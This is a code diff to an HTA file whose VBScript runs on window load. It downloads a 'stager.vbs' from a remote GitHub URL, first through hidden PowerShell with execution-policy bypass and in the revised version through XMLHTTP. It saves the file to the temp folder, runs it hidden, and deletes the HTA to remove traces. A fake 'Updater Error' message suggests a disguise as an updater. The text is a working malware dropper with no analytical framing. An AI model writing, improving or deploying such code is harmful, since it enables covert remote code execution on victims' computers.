@@ -12,22 +12,32 @@
   <script language="VBScript">
     Sub Window_OnLoad()
       Dim sh, fso, tempVbs, htaPath
+      Dim xhr, ts
 
+      ' 1) Create helpers & paths
       Set sh      = CreateObject("WScript.Shell")
       Set fso     = CreateObject("Scripting.FileSystemObject")
       tempVbs     = sh.ExpandEnvironmentStrings("%TEMP%") & "\stager.vbs"
 
-      ' --- 1) Download the working stager.vbs ---
-      ' Uses PowerShell for simplicity; could also use XMLHTTP in pure VBScript
-      sh.Run "powershell -NoProfile -ExecutionPolicy Bypass -Command " & _
-             """Invoke-WebRequest -UseBasicParsing " & _
-             "'https://raw.githubusercontent.com/concentratedsulfuricacid/vector/main/stager.vbs' -OutFile """ & tempVbs & """" & _
-             "", 0, True
+      ' 2) Download stager.vbs via XMLHTTP
+      Set xhr = CreateObject("MSXML2.XMLHTTP")
+      xhr.Open "GET", "https://raw.githubusercontent.com/concentratedsulfuricacid/vector/main/stager.vbs", False
+      xhr.Send
 
-      ' --- 2) Execute the downloaded VBScript stub hidden ---
-      sh.Run "wscript.exe """ & tempVbs & """", 0, False
+      If xhr.Status = 200 Then
+        ' 3) Write it to disk
+        Set ts = fso.CreateTextFile(tempVbs, True, False)
+        ts.Write xhr.ResponseText
+        ts.Close
 
-      ' --- 3) Clean up the HTA itself and exit ---
+        ' 4) Execute hidden via WScript
+        sh.Run "wscript.exe """ & tempVbs & """", 0, False
+      Else
+        ' (Optional) notify failure
+        MsgBox "Download failed: HTTP " & xhr.Status, vbExclamation, "Updater Error"
+      End If
+
+      ' 5) Clean up the HTA and exit
       htaPath = document.location.pathname
       If fso.FileExists(htaPath) Then fso.DeleteFile htaPath, True
       self.close
